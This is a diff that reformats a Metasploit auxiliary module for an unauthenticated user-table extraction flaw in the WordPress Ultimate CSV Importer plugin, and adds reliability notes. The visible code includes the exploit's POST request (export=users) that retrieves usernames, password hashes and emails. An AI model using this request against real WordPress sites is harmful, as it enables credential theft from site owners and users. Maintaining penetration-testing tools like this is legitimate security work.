@@ -10,28 +10,33 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(
-      info,
-      'Name'            => 'WordPress Ultimate CSV Importer User Table Extract',
-      'Description'     => %q{
-        Due to lack of verification of a visitor's permissions, it is possible
-        to execute the 'export.php' script included in the default installation of the
-        Ultimate CSV Importer plugin and retrieve the full contents of the user table
-        in the WordPress installation. This results in full disclosure of usernames,
-        hashed passwords and email addresses for all users.
-      },
-      'License'         => MSF_LICENSE,
-      'Author'          =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress Ultimate CSV Importer User Table Extract',
+        'Description' => %q{
+          Due to lack of verification of a visitor's permissions, it is possible
+          to execute the 'export.php' script included in the default installation of the
+          Ultimate CSV Importer plugin and retrieve the full contents of the user table
+          in the WordPress installation. This results in full disclosure of usernames,
+          hashed passwords and email addresses for all users.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'James Hooker', # Disclosure
-          'rastating'     # Metasploit module
+          'rastating' # Metasploit module
         ],
-      'References'      =>
-        [
+        'References' => [
           ['WPVDB', '7778']
         ],
-      'DisclosureDate'  => '2015-02-02'
-    ))
+        'DisclosureDate' => '2015-02-02',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
   end
 
   def plugin_url
@@ -89,8 +94,8 @@ class MetasploitModule < Msf::Auxiliary
   def run
     print_status("Requesting CSV extract...")
     res = send_request_cgi(
-      'method'    => 'POST',
-      'uri'       => exporter_url,
+      'method' => 'POST',
+      'uri' => exporter_url,
       'vars_post' => { 'export' => 'users' }
     )
     fail_with(Failure::Unreachable, 'No response from the target') if res.nil?
